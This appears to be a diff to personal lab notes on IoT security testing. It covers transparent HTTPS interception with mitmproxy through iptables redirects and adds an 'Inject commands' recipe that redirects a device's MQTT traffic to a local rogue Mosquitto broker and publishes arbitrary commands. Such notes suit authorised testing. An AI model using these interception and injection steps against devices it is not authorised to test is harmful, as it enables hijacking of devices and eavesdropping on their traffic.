@@ -14,13 +14,17 @@
   - `iptables -t nat -A PREROUTING -i wlp7s0 -p tcp --dport 80 -j REDIRECT --to-port 8080`
   - `iptables -t nat -A PREROUTING -i wlp7s0 -p tcp --dport 443 -j REDIRECT --to-port 8080`
  4. Exec mitmproxy:
-  - `mitmproxy --mode transparent --showhost -p 8080`
+  - `mitmproxy --mode transparent --showhost -p 8080 -k`
 
 ## Mosquitto
  - Install with `dnf install mosquitto` (fedora)
- - `mosquitto_sub` receives messages of the specified topic
+ - `mosquitto_sub -h <host> -p <port> -u <user> -P <password> -t <topic>` receives messages of the specified topic
    - `#` can be used to sub to all topics
  - `mosquitto_pub` publish simple messages
+ - Inject commands:
+  - Start local mosquitto broker: `mosquitto -p 8888`
+  - Redirect the connection to the local broker: `iptables -t nat -A PREROUTING -i wlp7s0 -p tcp --dport 1883 -j REDIRECT --to-port 8888`
+  - Send commands with: `mosquitto_pub -h localhost -p 8888 -t <topic> -m <command>`
 
 ## USB device
  - `sudo chmod 666 /dev/ttyUSB0` set permissions to usb device
